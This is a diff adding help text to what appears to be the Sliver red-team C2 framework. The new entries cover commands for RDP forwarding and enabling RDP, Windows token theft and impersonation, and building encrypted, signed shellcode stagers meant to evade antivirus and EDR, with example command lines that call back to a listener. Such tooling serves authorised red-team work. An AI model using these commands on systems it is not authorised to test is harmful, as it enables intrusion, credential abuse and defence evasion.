@@ -104,6 +104,10 @@ var (
 		consts.SSHStr:                                       sshHelp,
 		consts.DLLHijackStr:                                 dllHijackHelp,
 		consts.GetPrivsStr:                                  getPrivsHelp,
+		consts.RdpStr:                                       rdpHelp,
+		consts.StealTokenStr:                                stealTokenHelp,
+		consts.QuickImpersonateStr:                          quickImpersonateHelp,
+		consts.HarrietStr:                                   harrietHelp,
 		consts.ServicesStr:                                  servicesHelp,
 
 		// Loot
@@ -855,6 +859,72 @@ dllhijack --reference-path c:\\windows\\system32\\msasn1.dll --reference-file /t
 
 	getPrivsHelp = `[[.Bold]]Command:[[.Normal]] getprivs
 [[.Bold]]About:[[.Normal]] Get privilege information for the current process (Windows only).
+`
+
+	rdpHelp = `[[.Bold]]Command:[[.Normal]] rdp [flags]
+[[.Bold]]About:[[.Normal]] Quick RDP access. Automatically creates a port forward to the target's RDP port (3389)
+and optionally launches an RDP client (mstsc on Windows, xfreerdp on Linux).
+
+[[.Bold]]Examples:[[.Normal]]
+  rdp                              - Forward to session host:3389, auto-launch client
+  rdp -t 10.0.0.5                  - Forward to specific host
+  rdp -e                           - Enable RDP on target first, then connect
+  rdp -u admin -p Password1        - Auto-launch with credentials
+  rdp -n                           - Set up forward only, don't launch client
+  rdp --bind-port 23389            - Use custom local port
+
+[[.Bold]]Flags:[[.Normal]]
+  -t, --target       Target host (default: session remote address)
+  -r, --remote-port  Remote RDP port (default: 3389)
+  -b, --bind-port    Local bind port (default: 13389)
+  -e, --enable       Enable RDP on target via registry + firewall
+  -u, --username     RDP username for auto-launch
+  -p, --password     RDP password for auto-launch
+  -d, --domain       RDP domain for auto-launch
+  -n, --no-launch    Don't auto-launch RDP client
+`
+
+	stealTokenHelp = `[[.Bold]]Command:[[.Normal]] steal-token PID
+[[.Bold]]About:[[.Normal]] (Windows Only) Steal an access token from a running process by PID.
+Use [[.Bold]]ps[[.Normal]] first to identify target processes, then steal their token.
+
+[[.Bold]]Examples:[[.Normal]]
+  ps                     - List processes to find target PID
+  steal-token 1234       - Steal token from PID 1234
+  whoami                 - Verify impersonation
+  rev2self               - Revert to original token
+`
+
+	quickImpersonateHelp = `[[.Bold]]Command:[[.Normal]] quick-impersonate [flags]
+[[.Bold]]About:[[.Normal]] (Windows Only) Impersonate a user and optionally execute a command in one step.
+If a password is provided, creates a Type 9 (LOGON_NEW_CREDENTIALS) logon session.
+If no password, attempts to steal an existing logged-in user's token.
+
+[[.Bold]]Examples:[[.Normal]]
+  quick-impersonate -u admin -p Password1 -d CORP -e "net view \\\\dc01"
+  quick-impersonate -u admin -e "dir \\\\fileserver\\share"
+  quick-impersonate -u SYSTEM
+`
+
+	harrietHelp = `[[.Bold]]Command:[[.Normal]] harriet [flags]
+[[.Bold]]About:[[.Normal]] Generate an AES-encrypted Harriet stager wrapping Sliver shellcode.
+Produces a signed Windows EXE or DLL with function/variable obfuscation for AV/EDR evasion.
+
+Requires: Home-Grown-Red-Team Harriet repo, mingw cross-compiler (x86_64-w64-mingw32-g++),
+Python3 for AES encryption, osslsigncode for binary signing.
+
+[[.Bold]]Methods:[[.Normal]]
+  aes           - AES encrypted shellcode execution (default)
+  inject        - AES encrypted process injection
+  queueapc      - QueueUserAPC shellcode execution
+  nativeapi     - NativeAPI shellcode execution
+  directsyscall - Direct syscall shellcode execution
+
+[[.Bold]]Examples:[[.Normal]]
+  harriet -l 10.0.0.1:8443 -o implant.exe
+  harriet -l 10.0.0.1:8443 -m inject -f dll -o payload.dll
+  harriet -l 10.0.0.1:8443 -m directsyscall --no-sign
+  harriet --harriet-path /opt/Home-Grown-Red-Team/Harriet -l 10.0.0.1:8443
 `
 
 	cursedChromeHelp = `[[.Bold]]Command:[[.Normal]] cursed chrome
